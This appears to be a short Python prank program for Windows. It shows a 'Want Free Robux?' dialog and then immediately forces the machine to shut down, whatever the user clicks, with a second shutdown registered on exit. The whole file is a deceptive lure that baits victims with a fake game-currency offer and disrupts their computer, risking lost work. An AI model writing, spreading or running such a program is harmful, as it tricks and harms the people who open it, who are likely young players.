import os
import ctypes
import atexit

def shutdown():
    os.system("shutdown /s /t 0")

atexit.register(shutdown)

response = ctypes.windll.user32.MessageBoxW(0, "Want Free Robux?", "Free Robux", 4)

if response == 6:
    shutdown()
else:
    shutdown()